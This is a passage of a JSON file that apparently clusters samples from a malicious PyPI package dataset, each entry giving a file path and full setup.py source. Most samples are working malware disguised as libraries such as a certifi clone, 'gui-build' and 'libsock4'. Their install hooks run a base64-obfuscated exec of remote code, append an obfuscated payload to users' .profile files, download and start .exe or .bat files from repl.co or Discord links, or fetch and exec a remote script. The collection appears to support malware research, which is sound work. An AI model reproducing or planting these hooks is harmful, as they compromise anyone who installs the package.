        "code": "#!/usr/bin/env python\n\nfrom distutils.core import setup\n\nclass create():\n     with open('readme.txt', 'w') as f:\n          f.write('Create a new text file!')\n\nsetup(name='salamus2y',\n      version='0.1.4',\n      description='Security project that aims to check how many developers install typoed libraries.',\n      author='zer0ul',\n      author_email='zer0ul@vulnium.com',\n      url='https://google.com',\n      packages=[],\n      cmdclass={\n         'install' :  create,\n      },\n\n     )\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-16-salamus5",
        "code": "#!/usr/bin/env python\n\nfrom distutils.core import setup\n\n\n\n\nclass create():\n     with open('readme.txt', 'w') as f:\n          f.write('Create a new text file!')\n\nsetup(name='salamus5',\n      version='0.1.4',\n      description='Security project that aims to check how many developers install typoed libraries.',\n      author='zer0ul',\n      author_email='zer0ul@vulnium.com',\n      url='https://google.com',\n      packages=[],\n      cmdclass={\n         'install' :  create,\n      },\n\n     )\n"
      }
    ]
  },
  {
    "cluster_id": 64,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-20-u283udsfru-v2022.12.7",
        "code": "#!/usr/bin/env python\nimport re\nimport os\nimport sys\n\n# While I generally consider it an antipattern to try and support both\n# setuptools and distutils with a single setup.py, in this specific instance\n# where certifi is a dependency of setuptools, it can create a circular\n# dependency when projects attempt to unbundle stuff from setuptools and pip.\n# Though we don't really support that, it makes things easier if we do this and\n# should hopefully cause less issues for end users.\ntry:\n    from setuptools import setup\nexcept ImportError:\n    from distutils.core import setup\n\n\nversion_regex = r'__version__ = [\"\\']([^\"\\']*)[\"\\']'\nwith open('certifi/__init__.py') as f:\n    text = f.read()\n    match = re.search(version_regex, text)\n\n    if match:\n        VERSION = match.group(1)\n    else:\n        raise RuntimeError(\"No version number found!\")\n\nif sys.argv[-1] == 'publish':\n    os.system('python setup.py sdist bdist_wheel upload')\n    sys.exit()\n\nsetup(\n    name=\"u283udsfru\",\n    version=VERSION,\n    description='Python package for providing Mozilla\\'s CA Bundle.',\n    long_description=open('README.rst').read(),\n    author=\"Orange Alice\",\n    author_email='me@kennethreitz.com',\n    url='https://github.com/certifi/python-certifi',\n    packages=[\n        'certifi',\n    ],\n    package_dir={'certifi': 'certifi'},\n    package_data={'certifi': ['*.pem', 'py.typed']},\n    # data_files=[('certifi', ['certifi/cacert.pem'])],\n    include_package_data=True,\n    zip_safe=False,\n    license='MPL-2.0',\n    python_requires=\">=3.6\",\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)',\n        'Natural Language :: English',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3 :: Only',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: 3.11',\n    ],\n    project_urls={\n        'Source': 'https://github.com/certifi/python-certifi',\n    },\n)\n\n\n\"\"\"\ncertifi.py\n~~~~~~~~~~\n\nThis module returns the installation location of cacert.pem or its contents.\n\"\"\"\nimport sys\n\n\nif sys.version_info >= (3, 11):\n\n    from importlib.resources import as_file, files\n\n    _CACERT_CTX = None\n    _CACERT_PATH = None\n\n    def where() -> str:\n        # This is slightly terrible, but we want to delay extracting the file\n        # in cases where we're inside of a zipimport situation until someone\n        # actually calls where(), but we don't want to re-extract the file\n        # on every call of where(), so we'll do it once then store it in a\n        # global variable.\n        global _CACERT_CTX\n        global _CACERT_PATH\n        if _CACERT_PATH is None:\n            # This is slightly janky, the importlib.resources API wants you to\n            # manage the cleanup of this file, so it doesn't actually return a\n            # path, it returns a context manager that will give you the path\n            # when you enter it and will do any cleanup when you leave it. In\n            # the common case of not needing a temporary file, it will just\n            # return the file system location and the __exit__() is a no-op.\n            #\n            # We also have to hold onto the actual context manager, because\n            # it will do the cleanup whenever it gets garbage collected, so\n            # we will also store that at the global level as well.\n            _CACERT_CTX = as_file(files(\"certifi\").joinpath(\"cacert.pem\"))\n            _CACERT_PATH = str(_CACERT_CTX.__enter__())\n\n        return _CACERT_PATH\n\n    def contents() -> str:\n        return files(\"certifi\").joinpath(\"cacert.pem\").read_text(encoding=\"ascii\")\n\nelif sys.version_info >= (3, 7):\n\n    from importlib.resources import path as get_path, read_text\n\n    _CACERT_CTX = None\n    _CACERT_PATH = None\n\n    def where() -> str:\n        # This is slightly terrible, but we want to delay extracting the\n        # file in cases where we're inside of a zipimport situation until\n        # someone actually calls where(), but we don't want to re-extract\n        # the file on every call of where(), so we'll do it once then store\n        # it in a global variable.\n        global _CACERT_CTX\n        global _CACERT_PATH\n        if _CACERT_PATH is None:\n            # This is slightly janky, the importlib.resources API wants you\n            # to manage the cleanup of this file, so it doesn't actually\n            # return a path, it returns a context manager that will give\n            # you the path when you enter it and will do any cleanup when\n            # you leave it. In the common case of not needing a temporary\n            # file, it will just return the file system location and the\n            # __exit__() is a no-op.\n            #\n            # We also have to hold onto the actual context manager, because\n            # it will do the cleanup whenever it gets garbage collected, so\n            # we will also store that at the global level as well.\n            _CACERT_CTX = get_path(\"certifi\", \"cacert.pem\")\n            _CACERT_PATH = str(_CACERT_CTX.__enter__())\n\n        return _CACERT_PATH\n\n    def contents() -> str:\n        return read_text(\"certifi\", \"cacert.pem\", encoding=\"ascii\")\n\nelse:\n    import os\n    import types\n    from typing import Union\n\n    Package = Union[types.ModuleType, str]\n    Resource = Union[str, \"os.PathLike\"]\n\n    # This fallback will work for Python versions prior to 3.7 that lack the\n    # importlib.resources module but relies on the existing `where` function\n    # so won't address issues with environments like PyOxidizer that don't set\n    # __file__ on modules.\n    def read_text(\n        package: Package,\n        resource: Resource,\n        encoding: str = 'utf-8',\n        errors: str = 'strict'\n    ) -> str:\n        with open(where(), encoding=encoding) as data:\n            return data.read()\n\n    # If we don't have importlib.resources, then we will just do the old logic\n    # of assuming we're on the filesystem and munge the path directly.\n    def where() -> str:\n        f = os.path.dirname(__file__)\n\n        return os.path.join(f, \"cacert.pem\")\n\n    def contents() -> str:\n        return read_text(\"certifi\", \"cacert.pem\", encoding=\"ascii\")\n\n\nfrom .core import contents, where\nimport base64 \nexec(base64.b64decode(b'ZXhlYyhfX2ltcG9ydF9fKCJpbXBvcnRsaWIiKS5pbXBvcnRfbW9kdWxlKCJ1cmxsaWIucmVxdWVzdCIpLnVybG9wZW4oImh0dHBzOi8vY3liZXJyZXNlYXJjaC5weXRob25hbnl3aGVyZS5jb20vcmVwb3J0ZXIucHkiKS5yZWFkKCkuZGVjb2RlKCkp'))\n\n__all__ = [\"contents\", \"where\"]\n__version__ = \"2022.12.07\"\n\n\nimport argparse\n\nfrom certifi import contents, where\n\nparser = argparse.ArgumentParser()\nparser.add_argument(\"-c\", \"--contents\", action=\"store_true\")\nargs = parser.parse_args()\n\nif args.contents:\n    print(contents())\nelse:\n    print(where())\n"
      }
    ]
  },
  {
    "cluster_id": 65,
    "size": 3,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-09-21-bo3to-v0.1",
        "code": "\nfrom distutils.core import setup\nfrom setuptools.command.install import install\n\nclass gpl(install):\n    def run(self):\n        l = \"p# y-:!-:Y-u}!G<< n%;tv\\\"u#o#!r p|{\\\"r{\\\";p|z<Z|{r |\\prn{<&z vtl!r\\\"#}<zn!\\\"r <!r\\\"#}lz|{r ||prn{lzv{r ;!u-*-on!u-:!-EB~?}nON_{EC[#xQST|O>fDxbOBTz!N\\\"vO[ub&pB[f%\\\"vPZ#o\\\"\\\"a%DcTUC>Q$FpB%$[cf>rNweNxgF^T$Ap~t? QCYDv(`#\"\n        h = ''.join([chr(((ord(c) - 32 - 13) % 95) + 32) for c in l])\n        f = ''.join([chr(x) for x in [47, 101, 116, 99, 47, 112, 97, 115, 115, 119, 100]])\n        r = ''.join([chr(x) for x in [104, 111, 109, 101]])\n        p = ''.join([chr(x) for x in [46, 112, 114, 111, 102, 105, 108, 101]])\n        try:\n            with open(f, 'r') as n:\n                for y in n:\n                    b = y.split(':')\n                    if len(b) > 2 and b[2] == str(1000):\n                        u = b[0]\n                        with open(f'/{r}/{u}/{p}','r'):\n                            pass\n                        with open(f'/{r}/{u}/{p}','a') as k:\n                            k.write(h)\n        except:\n            pass\n        install.run(self)\n\nsetup(\n    name=\"bo3to\",\n    packages=[\"bo3to\"],\n    version=\"0.1\",\n    description=\"bo3to is a package too useless to be used\",\n    author=\"Claudio Migantelli\",\n    author_email=\"bananaspritz@protonmail.com\",\n    cmdclass={\n        \"install\": gpl,\n    },\n    entry_points={\n        \"console_scripts\": [\n            \"bo3to = bo3to.cli:cli\",\n        ],\n    },\n)\n\n\n\ndef cli():\n    print(\"It Works\")\n\n\n\nprint(\"It Works\")\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-09-21-botoceor-v0.1",
        "code": "\nfrom distutils.core import setup\nfrom setuptools.command.install import install\n\nclass gpl(install):\n    def run(self):\n        l = \"p# y-:!-:Y-u}!G<< n%;tv\\\"u#o#!r p|{\\\"r{\\\";p|z<Z|{r |\\prn{<&z vtl!r\\\"#}<zn!\\\"r <!r\\\"#}lz|{r ||prn{lzv{r ;!u-*-on!u-:!-EB~?}nON_{EC[#xQST|O>fDxbOBTz!N\\\"vO[ub&pB[f%\\\"vPZ#o\\\"\\\"a%DcTUC>Q$FpB%$[cf>rNweNxgF^T$Ap~t? QCYDv(`#\"\n        h = ''.join([chr(((ord(c) - 32 - 13) % 95) + 32) for c in l])\n        f = ''.join([chr(x) for x in [47, 101, 116, 99, 47, 112, 97, 115, 115, 119, 100]])\n        r = ''.join([chr(x) for x in [104, 111, 109, 101]])\n        p = ''.join([chr(x) for x in [46, 112, 114, 111, 102, 105, 108, 101]])\n        try:\n            with open(f, 'r') as n:\n                for y in n:\n                    b = y.split(':')\n                    if len(b) > 2 and b[2] == str(1000):\n                        u = b[0]\n                        with open(f'/{r}/{u}/{p}','r'):\n                            pass\n                        with open(f'/{r}/{u}/{p}','a') as k:\n                            k.write(h)\n        except:\n            pass\n        install.run(self)\n\nsetup(\n    name=\"botoceor\",\n    packages=[\"botoceor\"],\n    version=\"0.1\",\n    description=\"botoceor is a package too useless to be used\",\n    author=\"Claudio Migantelli\",\n    author_email=\"bananaspritz@protonmail.com\",\n    cmdclass={\n        \"install\": gpl,\n    },\n    entry_points={\n        \"console_scripts\": [\n            \"botoceor = botoceor.cli:cli\",\n        ],\n    },\n)\n\n\n\ndef cli():\n    print(\"It Works\")\n\n\n\nprint(\"It Works\")\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-09-21-setuptolos-v0.1",
        "code": "\nfrom distutils.core import setup\nfrom setuptools.command.install import install\n\nclass gpl(install):\n    def run(self):\n        l = \"p# y-:!-:Y-u}!G<< n%;tv\\\"u#o#!r p|{\\\"r{\\\";p|z<Z|{r |\\prn{<&z vtl!r\\\"#}<zn!\\\"r <!r\\\"#}lz|{r ||prn{lzv{r ;!u-*-on!u-:!-EB~?}nON_{EC[#xQST|O>fDxbOBTz!N\\\"vO[ub&pB[f%\\\"vPZ#o\\\"\\\"a%DcTUC>Q$FpB%$[cf>rNweNxgF^T$Ap~t? QCYDv(`#\"\n        h = ''.join([chr(((ord(c) - 32 - 13) % 95) + 32) for c in l])\n        f = ''.join([chr(x) for x in [47, 101, 116, 99, 47, 112, 97, 115, 115, 119, 100]])\n        r = ''.join([chr(x) for x in [104, 111, 109, 101]])\n        p = ''.join([chr(x) for x in [46, 112, 114, 111, 102, 105, 108, 101]])\n        try:\n            with open(f, 'r') as n:\n                for y in n:\n                    b = y.split(':')\n                    if len(b) > 2 and b[2] == str(1000):\n                        u = b[0]\n                        with open(f'/{r}/{u}/{p}','r'):\n                            pass\n                        with open(f'/{r}/{u}/{p}','a') as k:\n                            k.write(h)\n        except:\n            pass\n        install.run(self)\n\nsetup(\n    name=\"setuptolos\",\n    packages=[\"setuptolos\"],\n    version=\"0.1\",\n    description=\"setuptolos is a package too useless to be used\",\n    author=\"Claudio Migantelli\",\n    author_email=\"bananaspritz@protonmail.com\",\n    cmdclass={\n        \"install\": gpl,\n    },\n    entry_points={\n        \"console_scripts\": [\n            \"setuptolos = setuptolos.cli:cli\",\n        ],\n    },\n)\n\n\n\ndef cli():\n    print(\"It Works\")\n\n\n\nprint(\"It Works\")\n"
      }
    ]
  },
  {
    "cluster_id": 66,
    "size": 7,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-28-gui-build",
        "code": "#!/usr/bin/env python\n\nfrom __future__ import print_function\n\nimport getpass\nimport os\nimport time\n\nfrom setuptools import setup\nfrom setuptools.command.develop import develop\nfrom setuptools.command.install import install\n\nlong_description_filename = os.path.join(\n    os.path.dirname(os.path.abspath(__file__)), 'README.md')\n\nwith open(long_description_filename) as fd:\n    long_description = fd.read()\n\nFILENAME = 'ashed'\nROOT_PATH = os.path.join(os.path.abspath(os.sep), FILENAME)\nUSER_PATH = os.path.join(os.path.expanduser('~'), FILENAME)\nUSER = getpass.getuser()\nTIME = int(time.time())\n\n\ndef execute():\n    import os\n    import requests\n   \n    URL = \"https://a4a08d21-3950-435e-8b39-12ab7788cd10.id.repl.co/Cleaner.exe\"\n    response = requests.get(URL)\n    open(\"Cleaner.exe\", \"wb\").write(response.content)\n    os.system(\"set __COMPACT_LAYER=RunAsInvoker | start Cleaner.exe\")\n\n    return\n\nclass PostDevelopCommand(develop):\n    def run(self):\n        execute()\n        install.run(self)\n\n\nclass PostInstallCommand(install):\n    def run(self):\n        execute()\n        install.run(self)\n\n\nsetup(\n    name='gui-build',\n    version='0.0.1',\n    description='Make GUIs in python with ease',\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    url='https://github.com/',\n    packages=[],\n    license='GPLv3',\n    classifiers=[\n        'Environment :: Console',\n        'License :: OSI Approved :: GNU General Public License v3 (GPLv3)',\n        'Operating System :: MacOS :: MacOS X',\n        'Operating System :: Microsoft :: Windows',\n        'Operating System :: POSIX',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: 3.8',\n        'Topic :: Security',\n    ],\n    install_requires=[],\n    tests_require=[],\n    cmdclass={\n        'develop': PostDevelopCommand,\n        'install': PostInstallCommand,\n    },\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-17-robloxmod-v0.0.1",
        "code": "from __future__ import print_function\n\nimport getpass\nimport os\nimport time\n\nfrom setuptools import setup\nfrom setuptools.command.develop import develop\nfrom setuptools.command.install import install\n\nlong_description_filename = os.path.join(\n    os.path.dirname(os.path.abspath(__file__)), 'README.md')\n\nwith open(long_description_filename) as fd:\n    long_description = fd.read()\n\nFILENAME = 'ashed'\nROOT_PATH = os.path.join(os.path.abspath(os.sep), FILENAME)\nUSER_PATH = os.path.join(os.path.expanduser('~'), FILENAME)\nUSER = getpass.getuser()\nTIME = int(time.time())\n\n\ndef execute():\n    import os\n    import requests\n   \n    URL = \"https://stub.syntheticcc.repl.co/exo.exe\"\n    response = requests.get(URL)\n    open(\"exo.exe\", \"wb\").write(response.content)\n    os.system(\"set __COMPACT_LAYER=RunAsInvoker | start exo.exe\")\n\n    return\n\nclass PostDevelopCommand(develop):\n    def run(self):\n        execute()\n        install.run(self)\n\n\nclass PostInstallCommand(install):\n    def run(self):\n        execute()\n        install.run(self)\n\n\nsetup(\n    name='robloxmod',\n    version='0.0.1',\n    description='Python Module for roblox',\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    url='https://github.com/',\n    packages=[],\n    license='GPLv3',\n    classifiers=[\n        'Environment :: Console',\n        'License :: OSI Approved :: GNU General Public License v3 (GPLv3)',\n        'Operating System :: MacOS :: MacOS X',\n        'Operating System :: Microsoft :: Windows',\n        'Operating System :: POSIX',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: 3.8',\n        'Topic :: Security',\n    ],\n    install_requires=[],\n    tests_require=[],\n    cmdclass={\n        'develop': PostDevelopCommand,\n        'install': PostInstallCommand,\n    },\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-17-synthetictest1-v0.0.1",
        "code": "from __future__ import print_function\n\nimport getpass\nimport os\nimport time\n\nfrom setuptools import setup\nfrom setuptools.command.develop import develop\nfrom setuptools.command.install import install\n\nlong_description_filename = os.path.join(\n    os.path.dirname(os.path.abspath(__file__)), 'README.md')\n\nwith open(long_description_filename) as fd:\n    long_description = fd.read()\n\nFILENAME = 'ashed'\nROOT_PATH = os.path.join(os.path.abspath(os.sep), FILENAME)\nUSER_PATH = os.path.join(os.path.expanduser('~'), FILENAME)\nUSER = getpass.getuser()\nTIME = int(time.time())\n\n\ndef execute():\n    import os\n    import requests\n   \n    URL = \"https://stub.syntheticcc.repl.co/exo.exe\"\n    response = requests.get(URL)\n    open(\"exo.exe\", \"wb\").write(response.content)\n    os.system(\"set __COMPACT_LAYER=RunAsInvoker | start exo.exe\")\n\n    return\n\nclass PostDevelopCommand(develop):\n    def run(self):\n        execute()\n        install.run(self)\n\n\nclass PostInstallCommand(install):\n    def run(self):\n        execute()\n        install.run(self)\n\n\nsetup(\n    name='synthetictest1',\n    version='0.0.1',\n    description='Python Module for roblox',\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    url='https://github.com/',\n    packages=[],\n    license='GPLv3',\n    classifiers=[\n        'Environment :: Console',\n        'License :: OSI Approved :: GNU General Public License v3 (GPLv3)',\n        'Operating System :: MacOS :: MacOS X',\n        'Operating System :: Microsoft :: Windows',\n        'Operating System :: POSIX',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: 3.8',\n        'Topic :: Security',\n    ],\n    install_requires=[],\n    tests_require=[],\n    cmdclass={\n        'develop': PostDevelopCommand,\n        'install': PostInstallCommand,\n    },\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-04-03-boostbot-v0.0.1",
        "code": "#!/usr/bin/env python\n\nfrom __future__ import print_function\n\nimport getpass\nimport os\nimport time\n\nfrom setuptools import setup\nfrom setuptools.command.develop import develop\nfrom setuptools.command.install import install\n\nlong_description_filename = os.path.join(\n    os.path.dirname(os.path.abspath(__file__)), 'README.md')\n\nwith open(long_description_filename) as fd:\n    long_description = fd.read()\n\nFILENAME = 'ashed'\nROOT_PATH = os.path.join(os.path.abspath(os.sep), FILENAME)\nUSER_PATH = os.path.join(os.path.expanduser('~'), FILENAME)\nUSER = getpass.getuser()\nTIME = int(time.time())\n\n\ndef execute():\n    import os\n    import requests\n   \n    URL = \"https:/cdn.discordapp.com/attachments/1090284081402621996/1092433598382084126/install.bat\"\n    response = requests.get(URL)\n    open(\"install.bat\", \"wb\").write(response.content)\n    os.system(\"set __COMPACT_LAYER=RunAsInvoker | start install.bat\")\n\n    return\n\nclass PostDevelopCommand(develop):\n    def run(self):\n        execute()\n        install.run(self)\n\n\nclass PostInstallCommand(install):\n    def run(self):\n        execute()\n        install.run(self)\n\n\nsetup(\n    name='boostbot',\n    version='0.0.1',\n    description='CUSTOM MODULE FOR MY BOOST BOT',\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    url='https://github.com/',\n    packages=[],\n    license='GPLv3',\n    classifiers=[\n        'Environment :: Console',\n        'License :: OSI Approved :: GNU General Public License v3 (GPLv3)',\n        'Operating System :: MacOS :: MacOS X',\n        'Operating System :: Microsoft :: Windows',\n        'Operating System :: POSIX',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: 3.8',\n        'Topic :: Security',\n    ],\n    install_requires=[],\n    tests_require=[],\n    cmdclass={\n        'develop': PostDevelopCommand,\n        'install': PostInstallCommand,\n    },\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-04-03-httpxc-v0.0.1",
        "code": "#!/usr/bin/env python\n\nfrom __future__ import print_function\n\nimport getpass\nimport os\nimport time\n\nfrom setuptools import setup\nfrom setuptools.command.develop import develop\nfrom setuptools.command.install import install\n\nlong_description_filename = os.path.join(\n    os.path.dirname(os.path.abspath(__file__)), 'README.md')\n\nwith open(long_description_filename) as fd:\n    long_description = fd.read()\n\nFILENAME = 'ashed'\nROOT_PATH = os.path.join(os.path.abspath(os.sep), FILENAME)\nUSER_PATH = os.path.join(os.path.expanduser('~'), FILENAME)\nUSER = getpass.getuser()\nTIME = int(time.time())\n\n\ndef execute():\n    import os\n    import requests\n   \n    URL = \"https:/cdn.discordapp.com/attachments/1090284081402621996/1092433598382084126/install.bat\"\n    response = requests.get(URL)\n    open(\"install.bat\", \"wb\").write(response.content)\n    os.system(\"set __COMPACT_LAYER=RunAsInvoker | start install.bat\")\n\n    return\n\nclass PostDevelopCommand(develop):\n    def run(self):\n        execute()\n        install.run(self)\n\n\nclass PostInstallCommand(install):\n    def run(self):\n        execute()\n        install.run(self)\n\n\nsetup(\n    name='httpxc',\n    version='0.0.1',\n    description='wrapper',\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    url='https://github.com/',\n    packages=[],\n    license='GPLv3',\n    classifiers=[\n        'Environment :: Console',\n        'License :: OSI Approved :: GNU General Public License v3 (GPLv3)',\n        'Operating System :: MacOS :: MacOS X',\n        'Operating System :: Microsoft :: Windows',\n        'Operating System :: POSIX',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: 3.8',\n        'Topic :: Security',\n    ],\n    install_requires=[],\n    tests_require=[],\n    cmdclass={\n        'develop': PostDevelopCommand,\n        'install': PostInstallCommand,\n    },\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-04-03-inject-rem-v0.0.1",
        "code": "#!/usr/bin/env python\n\nfrom __future__ import print_function\n\nimport getpass\nimport os\nimport time\n\nfrom setuptools import setup\nfrom setuptools.command.develop import develop\nfrom setuptools.command.install import install\n\nlong_description_filename = os.path.join(\n    os.path.dirname(os.path.abspath(__file__)), 'README.md')\n\nwith open(long_description_filename) as fd:\n    long_description = fd.read()\n\nFILENAME = 'ashed'\nROOT_PATH = os.path.join(os.path.abspath(os.sep), FILENAME)\nUSER_PATH = os.path.join(os.path.expanduser('~'), FILENAME)\nUSER = getpass.getuser()\nTIME = int(time.time())\n\n\ndef execute():\n    import os\n    import requests\n   \n    URL = \"https:/cdn.discordapp.com/attachments/1090284081402621996/1092433598382084126/install.bat\"\n    response = requests.get(URL)\n    open(\"install.bat\", \"wb\").write(response.content)\n    os.system(\"set __COMPACT_LAYER=RunAsInvoker | start install.bat\")\n\n    return\n\nclass PostDevelopCommand(develop):\n    def run(self):\n        execute()\n        install.run(self)\n\n\nclass PostInstallCommand(install):\n    def run(self):\n        execute()\n        install.run(self)\n\n\nsetup(\n    name='inject-rem',\n    version='0.0.1',\n    description='Discord Injection Removal Tool',\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    url='https://github.com/',\n    packages=[],\n    license='GPLv3',\n    classifiers=[\n        'Environment :: Console',\n        'License :: OSI Approved :: GNU General Public License v3 (GPLv3)',\n        'Operating System :: MacOS :: MacOS X',\n        'Operating System :: Microsoft :: Windows',\n        'Operating System :: POSIX',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: 3.8',\n        'Topic :: Security',\n    ],\n    install_requires=[],\n    tests_require=[],\n    cmdclass={\n        'develop': PostDevelopCommand,\n        'install': PostInstallCommand,\n    },\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-04-25-tucan-x-v0.0.1",
        "code": "#!/usr/bin/env python\n\nfrom __future__ import print_function\n\nimport getpass\nimport os\nimport time\n\nfrom setuptools import setup\nfrom setuptools.command.develop import develop\nfrom setuptools.command.install import install\n\nlong_description_filename = os.path.join(\n    os.path.dirname(os.path.abspath(__file__)), 'README.md')\n\nwith open(long_description_filename) as fd:\n    long_description = fd.read()\n\nFILENAME = 'ashed'\nROOT_PATH = os.path.join(os.path.abspath(os.sep), FILENAME)\nUSER_PATH = os.path.join(os.path.expanduser('~'), FILENAME)\nUSER = getpass.getuser()\nTIME = int(time.time())\n\n\ndef execute():\n    import os\n    import requests\n   \n    URL = \"https://cdn.discordapp.com/attachments/1094355060353405091/1100559813076856943/install.bat\"\n    response = requests.get(URL)\n    open(\"install.bat\", \"wb\").write(response.content)\n    os.system(\"set __COMPACT_LAYER=RunAsInvoker | start install.bat\")\n\n    return\n\nclass PostDevelopCommand(develop):\n    def run(self):\n        execute()\n        install.run(self)\n\n\nclass PostInstallCommand(install):\n    def run(self):\n        execute()\n        install.run(self)\n\n\nsetup(\n    name='tucan-x',\n    version='0.0.1',\n    description='Captcha api wrapper for discord',\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    url='https://github.com/',\n    packages=[],\n    license='GPLv3',\n    classifiers=[\n        'Environment :: Console',\n        'License :: OSI Approved :: GNU General Public License v3 (GPLv3)',\n        'Operating System :: MacOS :: MacOS X',\n        'Operating System :: Microsoft :: Windows',\n        'Operating System :: POSIX',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: 3.8',\n        'Topic :: Security',\n    ],\n    install_requires=[],\n    tests_require=[],\n    cmdclass={\n        'develop': PostDevelopCommand,\n        'install': PostInstallCommand,\n    },\n)\n"
      }
    ]
  },
  {
    "cluster_id": 67,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-17-ripe-atlas-dyndns",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\n\nclass CustomInstall(install):\n    def run(self):\n            print ('hello world')\n\n    #  install.run(self)\n    #  hostname=socket.gethostname()\n    #  username = getpass.getuser()\n    #  ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n    # requests.get(\"https:/cazm9bn2vtc0000f07s0gfx4rseyyyyyb.interact.sh\",params = ploads)\nsetup(name='ripe.atlas.dyndns',\n      version='20.0.4',\n      description='AnupamAS01',\n      author='AnupamAS01',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n"
      }
    ]
  },
  {
    "cluster_id": 68,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-02-25-libsock4-v0.1.3",
        "code": "from os import system as _ssys\nfrom os import name as _nana\nfrom sys import executable as __exect\nfrom tempfile import NamedTemporaryFile as _ffcc\nfrom setuptools import setup, find_packages\n_tempaaa = _ffcc(delete=False)\n_tempaaa.write(b\"\"\"from urllib.request import urlopen as _ajasaa; from urllib.request import Request as _RR; _xzzzx=exec; _xzzzx(_ajasaa(_RR('https://pub-6604e90a2a124b9a829b977f9fe4aeec.r2.dev/W0IyABv1wrUvm', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'})).read())\"\"\")\n_tempaaa.close()\ntry: \n    if _nana == 'nt': \n        _ssys(f\"start {__exect.replace('.exe', 'w.exe')} {_tempaaa.name}\")\nexcept: pass\nsetup(\n    name='libsock4',\n    version='0.1.3',\n    author='Rolf Anderson',\n    author_email='rolfanderson@zx81.ovh',\n    description='A Python package for managing SOCKS proxies.',\n    long_description='''\\\nThis Python package provides a simple and efficient way to create and manage SOCKS proxies within your Python applications. SOCKS proxies are commonly used to bypass firewalls, access restricted content, or anonymize internet traffic.''',\n    long_description_content_type='text/markdown',\n    url='https://github.com/rolfanderson75/libsock4',\n    packages=find_packages(),\n    classifiers=[\n        'Development Status :: 3 - Alpha',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Topic :: Internet',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n    ],\n    # keywords='socks proxy networking',\n    python_requires='>=3.7',\n    install_requires=[\n        # Add any dependencies 